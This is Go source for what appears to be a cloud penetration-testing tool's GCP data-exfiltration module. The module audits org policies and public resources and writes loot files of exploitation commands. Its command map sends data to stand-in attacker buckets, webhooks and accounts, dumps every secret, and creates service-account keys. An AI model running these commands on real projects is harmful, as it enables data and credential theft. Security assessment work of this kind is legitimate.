package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	bigqueryservice "github.com/BishopFox/cloudfox/gcp/services/bigqueryService"
	foxmapperservice "github.com/BishopFox/cloudfox/gcp/services/foxmapperService"
	loggingservice "github.com/BishopFox/cloudfox/gcp/services/loggingService"
	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
	pubsubservice "github.com/BishopFox/cloudfox/gcp/services/pubsubService"
	vpcscservice "github.com/BishopFox/cloudfox/gcp/services/vpcscService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"

	compute "google.golang.org/api/compute/v1"
	sqladmin "google.golang.org/api/sqladmin/v1"
	storage "google.golang.org/api/storage/v1"
	storagetransfer "google.golang.org/api/storagetransfer/v1"
)

// Module name constant
const GCP_DATAEXFILTRATION_MODULE_NAME string = "data-exfiltration"

var GCPDataExfiltrationCommand = &cobra.Command{
	Use:     GCP_DATAEXFILTRATION_MODULE_NAME,
	Aliases: []string{"exfil", "data-exfil", "exfiltration"},
	Short:   "Identify data exfiltration paths and high-risk data exposure",
	Long: `Identify data exfiltration vectors and paths in GCP environments.

This module identifies both ACTUAL misconfigurations and POTENTIAL exfiltration vectors
using FoxMapper graph data for permission analysis.

Actual Findings (specific resources):
- Public snapshots and images (actual IAM policy check)
- Public buckets (actual IAM policy check)
- Cross-project logging sinks (actual sink enumeration)
- Pub/Sub push subscriptions to external endpoints
- BigQuery datasets with public IAM bindings
- Storage Transfer Service jobs to external destinations

Permission-Based Vectors (from FoxMapper graph):
- Storage objects read/list permissions
- BigQuery data access and export permissions
- Cloud SQL export and connect permissions
- Secret Manager access permissions
- KMS decrypt permissions
- Logging read permissions

Prerequisites:
- Run 'foxmapper gcp graph create' for permission-based analysis

Security Controls Checked:
- VPC Service Controls (VPC-SC) perimeter protection
- Organization policies for data protection

The loot file includes commands to perform each type of exfiltration.`,
	Run: runGCPDataExfiltrationCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

// ExfiltrationPath represents an actual misconfiguration or finding
type ExfiltrationPath struct {
	PathType       string   // Category of exfiltration
	ResourceName   string   // Specific resource
	ProjectID      string   // Source project
	Description    string   // What the path enables
	Destination    string   // Where data can go
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM, LOW
	RiskReasons    []string // Why this is risky
	ExploitCommand string   // Command to exploit
	VPCSCProtected bool     // Is this project protected by VPC-SC?
}

type PublicExport struct {
	ResourceType string
	ResourceName string
	ProjectID    string
	AccessLevel  string // "allUsers", "allAuthenticatedUsers"
	DataType     string
	Size         string
	RiskLevel    string
}

// OrgPolicyProtection tracks which org policies protect a project from data exfiltration
type OrgPolicyProtection struct {
	ProjectID                   string
	PublicAccessPrevention      bool // storage.publicAccessPrevention enforced
	DomainRestriction           bool // iam.allowedPolicyMemberDomains enforced
	SQLPublicIPRestriction      bool // sql.restrictPublicIp enforced
	ResourceLocationRestriction bool // gcp.resourceLocations enforced
	CloudFunctionsVPCConnector  bool // cloudfunctions.requireVPCConnector enforced
	CloudRunIngressRestriction  bool // run.allowedIngress enforced
	CloudRunRequireIAMInvoker   bool // run.allowedIngress = internal or internal-and-cloud-load-balancing
	DisableBQOmniAWS            bool // bigquery.disableBQOmniAWS enforced
	DisableBQOmniAzure          bool // bigquery.disableBQOmniAzure enforced
	MissingProtections          []string
}

// ------------------------------
// Module Struct
// ------------------------------
type DataExfiltrationModule struct {
	gcpinternal.BaseGCPModule

	ProjectExfiltrationPaths map[string][]ExfiltrationPath                // projectID -> paths
	ProjectPublicExports     map[string][]PublicExport                    // projectID -> exports
	FoxMapperFindings        []foxmapperservice.DataExfilFinding          // FoxMapper-based findings
	LootMap                  map[string]map[string]*internal.LootFile     // projectID -> loot files
	mu                       sync.Mutex
	vpcscProtectedProj       map[string]bool                 // Projects protected by VPC-SC
	orgPolicyProtection      map[string]*OrgPolicyProtection // Org policy protections per project
	FoxMapperCache           *gcpinternal.FoxMapperCache     // FoxMapper cache for unified data access
	OrgCache                 *gcpinternal.OrgCache           // OrgCache for ancestry lookups
}

// ------------------------------
// Output Struct
// ------------------------------
type DataExfiltrationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataExfiltrationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataExfiltrationOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_DATAEXFILTRATION_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DataExfiltrationModule{
		BaseGCPModule:            gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectExfiltrationPaths: make(map[string][]ExfiltrationPath),
		ProjectPublicExports:     make(map[string][]PublicExport),
		FoxMapperFindings:        []foxmapperservice.DataExfilFinding{},
		LootMap:                  make(map[string]map[string]*internal.LootFile),
		vpcscProtectedProj:       make(map[string]bool),
		orgPolicyProtection:      make(map[string]*OrgPolicyProtection),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *DataExfiltrationModule) getAllExfiltrationPaths() []ExfiltrationPath {
	var all []ExfiltrationPath
	for _, paths := range m.ProjectExfiltrationPaths {
		all = append(all, paths...)
	}
	return all
}

func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
	var all []PublicExport
	for _, exports := range m.ProjectPublicExports {
		all = append(all, exports...)
	}
	return all
}

// filterFindingsByProjects filters FoxMapper findings to only include principals
// from the specified projects (via -p or -l flags) OR principals without a clear project
// (users, groups, compute default SAs, etc.)
func (m *DataExfiltrationModule) filterFindingsByProjects(findings []foxmapperservice.DataExfilFinding) []foxmapperservice.DataExfilFinding {
	// Build a set of specified project IDs for fast lookup
	specifiedProjects := make(map[string]bool)
	for _, projectID := range m.ProjectIDs {
		specifiedProjects[projectID] = true
	}

	var filtered []foxmapperservice.DataExfilFinding

	for _, finding := range findings {
		// Filter principals to only those from specified projects OR without a clear project
		var filteredPrincipals []foxmapperservice.PrincipalAccess
		for _, p := range finding.Principals {
			principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
			// Include if:
			// 1. Principal's project is in our specified list, OR
			// 2. Principal has no clear project (users, groups, compute default SAs)
			if specifiedProjects[principalProject] || principalProject == "" {
				filteredPrincipals = append(filteredPrincipals, p)
			}
		}

		// Only include the finding if it has matching principals
		if len(filteredPrincipals) > 0 {
			filteredFinding := finding
			filteredFinding.Principals = filteredPrincipals
			filtered = append(filtered, filteredFinding)
		}
	}

	return filtered
}

// countFindingsByProject returns a count of findings per project for debugging
func (m *DataExfiltrationModule) countFindingsByProject() map[string]int {
	counts := make(map[string]int)
	for _, f := range m.FoxMapperFindings {
		for _, p := range f.Principals {
			proj := extractProjectFromPrincipal(p.Principal, m.OrgCache)
			if proj == "" {
				proj = "(unknown)"
			}
			counts[proj]++
		}
	}
	return counts
}

func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)

	// Load OrgCache for ancestry lookups (needed for per-project filtering)
	m.OrgCache = gcpinternal.GetOrgCacheFromContext(ctx)
	if m.OrgCache == nil || !m.OrgCache.IsPopulated() {
		diskCache, _, err := gcpinternal.LoadOrgCacheFromFile(m.OutputDirectory, m.Account)
		if err == nil && diskCache != nil && diskCache.IsPopulated() {
			m.OrgCache = diskCache
		}
	}

	// Get FoxMapper cache from context or try to load it
	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)
	if m.FoxMapperCache == nil || !m.FoxMapperCache.IsPopulated() {
		// Try to load FoxMapper data (org from hierarchy if available)
		orgID := ""
		if m.Hierarchy != nil && len(m.Hierarchy.Organizations) > 0 {
			orgID = m.Hierarchy.Organizations[0].ID
		}
		m.FoxMapperCache = gcpinternal.TryLoadFoxMapper(orgID, m.ProjectIDs)
	}

	// First, check VPC-SC protection status for all projects
	m.checkVPCSCProtection(ctx, logger)

	// Check organization policy protections for all projects
	m.checkOrgPolicyProtection(ctx, logger)

	// Process each project for actual misconfigurations
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)

	// Analyze permission-based exfiltration using FoxMapper
	if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
		logger.InfoM("Analyzing permission-based exfiltration paths using FoxMapper...", GCP_DATAEXFILTRATION_MODULE_NAME)
		svc := m.FoxMapperCache.GetService()
		allFindings := svc.AnalyzeDataExfil("")

		// Filter findings to only include principals from specified projects
		m.FoxMapperFindings = m.filterFindingsByProjects(allFindings)

		if len(m.FoxMapperFindings) > 0 {
			logger.InfoM(fmt.Sprintf("Found %d permission-based exfiltration techniques with access", len(m.FoxMapperFindings)), GCP_DATAEXFILTRATION_MODULE_NAME)

			// Log findings per project for debugging
			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
				counts := m.countFindingsByProject()
				for proj, count := range counts {
					logger.InfoM(fmt.Sprintf("  - %s: %d principals", proj, count), GCP_DATAEXFILTRATION_MODULE_NAME)
				}
			}
		}
	} else {
		logger.InfoM("No FoxMapper data found - skipping permission-based analysis. Run 'foxmapper gcp graph create' for full analysis.", GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	allPaths := m.getAllExfiltrationPaths()

	// Check results
	hasResults := len(allPaths) > 0 || len(m.FoxMapperFindings) > 0

	if !hasResults {
		logger.InfoM("No data exfiltration paths found", GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	if len(allPaths) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d actual misconfiguration(s)", len(allPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
	if len(m.FoxMapperFindings) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d permission-based exfiltration technique(s) with access", len(m.FoxMapperFindings)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// ------------------------------
// VPC-SC Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkVPCSCProtection(ctx context.Context, logger internal.Logger) {
	vpcsc := vpcscservice.New()

	if len(m.ProjectIDs) == 0 {
		return
	}

	policies, err := vpcsc.ListAccessPolicies("")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			logger.InfoM("Could not check VPC-SC policies (may require org-level access)", GCP_DATAEXFILTRATION_MODULE_NAME)
		}
		return
	}

	for _, policy := range policies {
		perimeters, err := vpcsc.ListServicePerimeters(policy.Name)
		if err != nil {
			continue
		}

		for _, perimeter := range perimeters {
			for _, resource := range perimeter.Resources {
				projectNum := strings.TrimPrefix(resource, "projects/")
				m.mu.Lock()
				m.vpcscProtectedProj[projectNum] = true
				m.mu.Unlock()
			}
		}
	}
}

// ------------------------------
// Organization Policy Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, logger internal.Logger) {
	orgSvc := orgpolicyservice.New()

	for _, projectID := range m.ProjectIDs {
		protection := &OrgPolicyProtection{
			ProjectID:          projectID,
			MissingProtections: []string{},
		}

		policies, err := orgSvc.ListProjectPolicies(projectID)
		if err != nil {
			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Could not check org policies for %s: %v", projectID, err), GCP_DATAEXFILTRATION_MODULE_NAME)
			}
			m.mu.Lock()
			m.orgPolicyProtection[projectID] = protection
			m.mu.Unlock()
			continue
		}

		for _, policy := range policies {
			switch policy.Constraint {
			case "constraints/storage.publicAccessPrevention":
				if policy.Enforced {
					protection.PublicAccessPrevention = true
				}
			case "constraints/iam.allowedPolicyMemberDomains":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.DomainRestriction = true
				}
			case "constraints/sql.restrictPublicIp":
				if policy.Enforced {
					protection.SQLPublicIPRestriction = true
				}
			case "constraints/gcp.resourceLocations":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.ResourceLocationRestriction = true
				}
			case "constraints/cloudfunctions.requireVPCConnector":
				if policy.Enforced {
					protection.CloudFunctionsVPCConnector = true
				}
			case "constraints/run.allowedIngress":
				if len(policy.AllowedValues) > 0 {
					for _, val := range policy.AllowedValues {
						if val == "internal" || val == "internal-and-cloud-load-balancing" {
							protection.CloudRunIngressRestriction = true
							break
						}
					}
				}
			case "constraints/bigquery.disableBQOmniAWS":
				if policy.Enforced {
					protection.DisableBQOmniAWS = true
				}
			case "constraints/bigquery.disableBQOmniAzure":
				if policy.Enforced {
					protection.DisableBQOmniAzure = true
				}
			}
		}

		// Identify missing protections
		if !protection.PublicAccessPrevention {
			protection.MissingProtections = append(protection.MissingProtections, "storage.publicAccessPrevention not enforced")
		}
		if !protection.DomainRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "iam.allowedPolicyMemberDomains not configured")
		}
		if !protection.SQLPublicIPRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "sql.restrictPublicIp not enforced")
		}
		if !protection.CloudFunctionsVPCConnector {
			protection.MissingProtections = append(protection.MissingProtections, "cloudfunctions.requireVPCConnector not enforced")
		}
		if !protection.CloudRunIngressRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "run.allowedIngress not restricted")
		}
		if !protection.DisableBQOmniAWS {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAWS not enforced")
		}
		if !protection.DisableBQOmniAzure {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAzure not enforced")
		}

		m.mu.Lock()
		m.orgPolicyProtection[projectID] = protection
		m.mu.Unlock()
	}
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *DataExfiltrationModule) initializeLootForProject(projectID string) {
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["data-exfiltration-commands"] = &internal.LootFile{
			Name:     "data-exfiltration-commands",
			Contents: "# Data Exfiltration Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
	}
}

// getExploitCommand returns specific exploitation commands for a permission
func getExploitCommand(permission, principal, project string) string {
	// Map permissions to specific gcloud/gsutil commands
	commands := map[string]string{
		// Storage
		"storage.objects.get":           "gsutil cp gs://BUCKET/OBJECT ./\ngcloud storage cp gs://BUCKET/OBJECT ./",
		"storage.objects.list":          "gsutil ls -r gs://BUCKET/\ngcloud storage ls --recursive gs://BUCKET/",
		"storage.buckets.setIamPolicy":  "gsutil iam ch allUsers:objectViewer gs://BUCKET\n# Or grant yourself access:\ngsutil iam ch user:ATTACKER@EMAIL:objectAdmin gs://BUCKET",
		"storage.hmacKeys.create":       "gsutil hmac create SERVICE_ACCOUNT_EMAIL",

		// IAM / Service Account Impersonation
		"iam.serviceAccounts.signBlob":      "gcloud iam service-accounts sign-blob --iam-account=TARGET_SA input.txt output.sig",
		"iam.serviceAccountKeys.create":     "gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA",
		"iam.serviceAccounts.getAccessToken": "gcloud auth print-access-token --impersonate-service-account=TARGET_SA",

		// Storage Transfer
		"storagetransfer.jobs.create": "# Create transfer job to exfil bucket to external destination\ngcloud transfer jobs create gs://SOURCE_BUCKET gs://ATTACKER_BUCKET --name=exfil-job",
		"storagetransfer.jobs.update": "# Update existing transfer job destination\ngcloud transfer jobs update JOB_NAME --destination=gs://ATTACKER_BUCKET",
		"storagetransfer.jobs.run":    "gcloud transfer jobs run JOB_NAME",

		// BigQuery
		"bigquery.tables.export":       "bq extract --destination_format=CSV PROJECT:DATASET.TABLE gs://BUCKET/export.csv",
		"bigquery.tables.getData":      "bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT.DATASET.TABLE` LIMIT 1000'",
		"bigquery.jobs.create":         "bq query --use_legacy_sql=false 'SELECT * FROM `PROJECT.DATASET.TABLE`'\nbq extract PROJECT:DATASET.TABLE gs://BUCKET/export.csv",
		"bigquery.datasets.setIamPolicy": "bq add-iam-policy-binding --member=user:ATTACKER@EMAIL --role=roles/bigquery.dataViewer PROJECT:DATASET",

		// Cloud SQL
		"cloudsql.instances.export":  "gcloud sql export sql INSTANCE gs://BUCKET/export.sql --database=DATABASE",
		"cloudsql.backupRuns.create": "gcloud sql backups create --instance=INSTANCE",
		"cloudsql.instances.connect": "gcloud sql connect INSTANCE --user=USER --database=DATABASE",
		"cloudsql.users.create":      "gcloud sql users create ATTACKER --instance=INSTANCE --password=PASSWORD",

		// Spanner
		"spanner.databases.export": "gcloud spanner databases export DATABASE --instance=INSTANCE --destination-uri=gs://BUCKET/spanner-export/",
		"spanner.databases.read":   "gcloud spanner databases execute-sql DATABASE --instance=INSTANCE --sql='SELECT * FROM TABLE_NAME'",
		"spanner.backups.create":   "gcloud spanner backups create BACKUP --instance=INSTANCE --database=DATABASE --retention-period=7d",

		// Datastore / Firestore
		"datastore.databases.export": "gcloud datastore export gs://BUCKET/datastore-export/ --namespaces='(default)'",
		"datastore.entities.get":     "gcloud datastore export gs://BUCKET/datastore-export/",

		// Bigtable
		"bigtable.tables.readRows": "cbt -project=PROJECT -instance=INSTANCE read TABLE",
		"bigtable.backups.create":  "cbt -project=PROJECT -instance=INSTANCE createbackup CLUSTER BACKUP TABLE",

		// Pub/Sub
		"pubsub.subscriptions.create":  "gcloud pubsub subscriptions create ATTACKER_SUB --topic=TOPIC\ngcloud pubsub subscriptions pull ATTACKER_SUB --auto-ack --limit=100",
		"pubsub.subscriptions.consume": "gcloud pubsub subscriptions pull SUBSCRIPTION --auto-ack --limit=100",
		"pubsub.subscriptions.update":  "gcloud pubsub subscriptions update SUBSCRIPTION --push-endpoint=https://ATTACKER.COM/webhook",

		// Compute
		"compute.snapshots.create":     "gcloud compute snapshots create SNAPSHOT_NAME --source-disk=DISK_NAME --source-disk-zone=ZONE",
		"compute.disks.createSnapshot": "gcloud compute disks snapshot DISK_NAME --zone=ZONE --snapshot-names=SNAPSHOT_NAME",
		"compute.images.create":        "gcloud compute images create IMAGE_NAME --source-disk=DISK_NAME --source-disk-zone=ZONE",
		"compute.machineImages.create": "gcloud compute machine-images create IMAGE_NAME --source-instance=INSTANCE --source-instance-zone=ZONE",
		"compute.images.setIamPolicy":  "gcloud compute images add-iam-policy-binding IMAGE --member=user:ATTACKER@EMAIL --role=roles/compute.imageUser",
		"compute.snapshots.setIamPolicy": "gcloud compute snapshots add-iam-policy-binding SNAPSHOT --member=user:ATTACKER@EMAIL --role=roles/compute.storageAdmin",

		// Logging
		"logging.sinks.create": "gcloud logging sinks create SINK_NAME storage.googleapis.com/ATTACKER_BUCKET --log-filter='resource.type=\"gce_instance\"'",
		"logging.sinks.update": "gcloud logging sinks update SINK_NAME --destination=storage.googleapis.com/ATTACKER_BUCKET",
		"logging.logEntries.list": "gcloud logging read 'resource.type=\"gce_instance\"' --limit=1000 --format=json > logs.json",

		// Secret Manager
		"secretmanager.versions.access": "gcloud secrets versions access latest --secret=SECRET_NAME",
		"secretmanager.secrets.list":    "gcloud secrets list --format='value(name)'\n# Then access each secret:\nfor secret in $(gcloud secrets list --format='value(name)'); do gcloud secrets versions access latest --secret=$secret; done",

		// KMS
		"cloudkms.cryptoKeyVersions.useToDecrypt": "gcloud kms decrypt --key=KEY_NAME --keyring=KEYRING --location=LOCATION --ciphertext-file=encrypted.bin --plaintext-file=decrypted.txt",
		"cloudkms.cryptoKeys.setIamPolicy":        "gcloud kms keys add-iam-policy-binding KEY_NAME --keyring=KEYRING --location=LOCATION --member=user:ATTACKER@EMAIL --role=roles/cloudkms.cryptoKeyDecrypter",

		// Artifact Registry
		"artifactregistry.repositories.downloadArtifacts": "gcloud artifacts docker images list LOCATION-docker.pkg.dev/PROJECT/REPO\ndocker pull LOCATION-docker.pkg.dev/PROJECT/REPO/IMAGE:TAG",
		"artifactregistry.repositories.setIamPolicy":      "gcloud artifacts repositories add-iam-policy-binding REPO --location=LOCATION --member=user:ATTACKER@EMAIL --role=roles/artifactregistry.reader",

		// Cloud Functions
		"cloudfunctions.functions.get":           "gcloud functions describe FUNCTION_NAME --region=REGION",
		"cloudfunctions.functions.sourceCodeGet": "gcloud functions describe FUNCTION_NAME --region=REGION --format='value(sourceArchiveUrl)'\ngsutil cp SOURCE_URL ./function-source.zip",

		// Cloud Run
		"run.services.get": "gcloud run services describe SERVICE --region=REGION --format=yaml",

		// Dataproc
		"dataproc.jobs.create": "gcloud dataproc jobs submit spark --cluster=CLUSTER --region=REGION --class=org.example.ExfilJob --jars=gs://ATTACKER_BUCKET/exfil.jar",

		// Dataflow
		"dataflow.jobs.create": "gcloud dataflow jobs run exfil-job --gcs-location=gs://dataflow-templates/latest/GCS_to_GCS --region=REGION --parameters inputDirectory=gs://SOURCE_BUCKET,outputDirectory=gs://ATTACKER_BUCKET",

		// Redis
		"redis.instances.export": "gcloud redis instances export gs://BUCKET/redis-export.rdb --instance=INSTANCE --region=REGION",

		// AlloyDB
		"alloydb.backups.create": "gcloud alloydb backups create BACKUP --cluster=CLUSTER --region=REGION",

		// Source Repos
		"source.repos.get": "gcloud source repos clone REPO_NAME\ncd REPO_NAME && git log --all",

		// Healthcare API
		"healthcare.fhirResources.get":            "curl -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://healthcare.googleapis.com/v1/projects/PROJECT/locations/LOCATION/datasets/DATASET/fhirStores/STORE/fhir/Patient\"",
		"healthcare.dicomStores.dicomWebRetrieve": "curl -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://healthcare.googleapis.com/v1/projects/PROJECT/locations/LOCATION/datasets/DATASET/dicomStores/STORE/dicomWeb/studies\"",
		"healthcare.datasets.export":              "gcloud healthcare datasets export DATASET --location=LOCATION --destination-uri=gs://BUCKET/healthcare-export/",
	}

	cmd, ok := commands[permission]
	if !ok {
		return fmt.Sprintf("# No specific command for %s - check gcloud documentation", permission)
	}

	// Replace placeholders with actual values where possible
	if project != "" && project != "-" {
		cmd = strings.ReplaceAll(cmd, "PROJECT", project)
	}

	return cmd
}

// generatePlaybookForProject generates a loot file specific to a project
// It includes SAs from that project + users/groups (which apply to all projects)
func (m *DataExfiltrationModule) generatePlaybookForProject(projectID string) *internal.LootFile {
	var sb strings.Builder
	sb.WriteString("# GCP Data Exfiltration Commands\n")
	sb.WriteString(fmt.Sprintf("# Project: %s\n", projectID))
	sb.WriteString("# Generated by CloudFox\n")
	sb.WriteString("# WARNING: Only use with proper authorization\n\n")

	// Actual misconfigurations for this project
	paths := m.ProjectExfiltrationPaths[projectID]
	if len(paths) > 0 {
		sb.WriteString("# === ACTUAL MISCONFIGURATIONS ===\n\n")
		for _, path := range paths {
			sb.WriteString(fmt.Sprintf("# =============================================================================\n"+
				"# %s: %s\n"+
				"# =============================================================================\n", path.PathType, path.ResourceName))
			sb.WriteString(fmt.Sprintf("# Description: %s\n", path.Description))
			if path.ExploitCommand != "" {
				sb.WriteString(path.ExploitCommand)
				sb.WriteString("\n\n")
			}
		}
	}

	// Permission-based findings from FoxMapper - filter to this project's principals + users/groups
	if len(m.FoxMapperFindings) > 0 {
		hasFindings := false

		for _, finding := range m.FoxMapperFindings {
			var relevantPrincipals []foxmapperservice.PrincipalAccess

			for _, p := range finding.Principals {
				principalProject := extractProjectFromPrincipal(p.Principal, m.OrgCache)
				// Include if: SA from this project OR user/group (no project)
				if principalProject == projectID || principalProject == "" {
					relevantPrincipals = append(relevantPrincipals, p)
				}
			}

			if len(relevantPrincipals) == 0 {
				continue
			}

			if !hasFindings {
				sb.WriteString("# === PERMISSION-BASED EXFILTRATION COMMANDS ===\n\n")
				hasFindings = true
			}

			sb.WriteString(fmt.Sprintf("# =============================================================================\n"+
				"# %s (%s)\n"+
				"# =============================================================================\n", finding.Permission, finding.Service))
			sb.WriteString(fmt.Sprintf("# %s\n\n", finding.Description))

			for _, p := range relevantPrincipals {
				project := extractProjectFromPrincipal(p.Principal, m.OrgCache)
				if project == "" {
					project = projectID // Use the target project for users/groups
				}

				principalType := p.MemberType
				if principalType == "" {
					if p.IsServiceAccount {
						principalType = "serviceAccount"
					} else {
						principalType = "user"
					}
				}

				sb.WriteString(fmt.Sprintf("## %s (%s)\n", p.Principal, principalType))

				// Add impersonation command if it's a service account
				if p.IsServiceAccount {
					sb.WriteString(fmt.Sprintf("# Impersonate first:\ngcloud config set auth/impersonate_service_account %s\n\n", p.Principal))
				}

				// Add the exploitation command
				cmd := getExploitCommand(finding.Permission, p.Principal, project)
				sb.WriteString(cmd)
				sb.WriteString("\n\n")

				// Reset impersonation note
				if p.IsServiceAccount {
					sb.WriteString("# Reset impersonation when done:\n# gcloud config unset auth/impersonate_service_account\n\n")
				}
			}
		}
	}

	contents := sb.String()
	// Don't return empty loot file
	if contents == fmt.Sprintf("# GCP Data Exfiltration Commands\n# Project: %s\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n", projectID) {
		return nil
	}

	return &internal.LootFile{
		Name:     "data-exfiltration-commands",
		Contents: contents,
	}
}

func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing exfiltration paths in project: %s", projectID), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.mu.Lock()
	m.initializeLootForProject(projectID)
	m.mu.Unlock()

	// === ACTUAL MISCONFIGURATIONS ===

	// 1. Find public/shared snapshots
	m.findPublicSnapshots(ctx, projectID, logger)

	// 2. Find public/shared images
	m.findPublicImages(ctx, projectID, logger)

	// 3. Find public buckets
	m.findPublicBuckets(ctx, projectID, logger)

	// 4. Find cross-project logging sinks
	m.findCrossProjectLoggingSinks(ctx, projectID, logger)

	// 5. Find Pub/Sub push subscriptions to external endpoints
	m.findPubSubPushEndpoints(ctx, projectID, logger)

	// 6. Find Pub/Sub subscriptions exporting to external destinations
	m.findPubSubExportSubscriptions(ctx, projectID, logger)

	// 7. Find BigQuery datasets with public access
	m.findPublicBigQueryDatasets(ctx, projectID, logger)

	// 8. Find Cloud SQL with export enabled
	m.findCloudSQLExportConfig(ctx, projectID, logger)

	// 9. Find Storage Transfer jobs to external destinations
	m.findStorageTransferJobs(ctx, projectID, logger)
}

// findPublicSnapshots finds snapshots that are publicly accessible
func (m *DataExfiltrationModule) findPublicSnapshots(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Compute service in project %s", projectID))
		return
	}

	req := computeService.Snapshots.List(projectID)
	err = req.Pages(ctx, func(page *compute.SnapshotList) error {
		for _, snapshot := range page.Items {
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "Disk Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "disk_snapshot",
					Size:         fmt.Sprintf("%d GB", snapshot.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Disk snapshot (%d GB) accessible to %s", snapshot.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"Snapshot is publicly accessible", "May contain sensitive data from disk"},
					ExploitCommand: fmt.Sprintf(
						"# Create disk from public snapshot\n"+
							"gcloud compute disks create exfil-disk --source-snapshot=projects/%s/global/snapshots/%s --zone=us-central1-a",
						projectID, snapshot.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list snapshots in project %s", projectID))
	}
}

// findPublicImages finds images that are publicly accessible
func (m *DataExfiltrationModule) findPublicImages(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		return
	}

	req := computeService.Images.List(projectID)
	err = req.Pages(ctx, func(page *compute.ImageList) error {
		for _, image := range page.Items {
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "VM Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "vm_image",
